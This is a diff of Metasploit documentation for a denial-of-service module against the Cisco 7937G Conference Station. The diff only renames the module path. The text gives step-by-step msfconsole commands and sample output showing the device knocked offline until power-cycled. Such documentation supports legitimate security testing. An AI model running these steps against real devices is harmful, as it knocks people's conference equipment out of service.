@@ -12,7 +12,7 @@ This module exploits a bug in how the conference station handles incoming SSH co
   1. Obtain a Cisco 7937G Conference Station.
   2. Enable SSH Access on the device.
   3. Start msfconsole
-  4. Do: `use auxiliary/dos/cisco/cve_2020_16138`
+  4. Do: `use auxiliary/dos/cisco/cisco_7937G_DoS`
   5. Do: `set RHOST 192.168.1.10`
   6. Do: `run`
   7. The conference station should now be nonresponsive until it is power cycled
@@ -23,10 +23,10 @@ This module exploits a bug in how the conference station handles incoming SSH co
 
 #### Successful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cve_2020_16138 
-msf5 auxiliary(dos/cisco/cve_2020_16138) > set rhost 192.168.110.209
+msf5 > use auxiliary/dos/cisco/cisco_7937G_DoS 
+msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cve_2020_16138) > run
+msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 
 [*] Starting server...
 [*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
@@ -48,10 +48,10 @@ msf5 auxiliary(dos/cisco/cve_2020_16138) > run
 
 #### Unsuccessful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cve_2020_16138 
-msf5 auxiliary(dos/cisco/cve_2020_16138) > set rhost 192.168.110.209
+msf5 > use auxiliary/dos/cisco/cisco_7937G_DoS 
+msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cve_2020_16138) > run
+msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 
 [*] Starting server...
 [-] 192.168.110.209 - Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.
@@ -62,10 +62,10 @@ msf5 auxiliary(dos/cisco/cve_2020_16138) > run
 
 #### Successful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cve_2020_16138 
-msf5 auxiliary(dos/cisco/cve_2020_16138) > set rhost 192.168.110.209
+msf5 > use auxiliary/dos/cisco/cisco_7937G_DoS 
+msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cve_2020_16138) > run
+msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 
 [*] Starting server...
 [*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
@@ -87,10 +87,10 @@ msf5 auxiliary(dos/cisco/cve_2020_16138) > run
 
 #### Unsuccessful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cve_2020_16138 
-msf5 auxiliary(dos/cisco/cve_2020_16138) > set rhost 192.168.110.209
+msf5 > use auxiliary/dos/cisco/cisco_7937G_DoS 
+msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cve_2020_16138) > run
+msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 
 [*] Starting server...
 [-] 192.168.110.209 - Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.
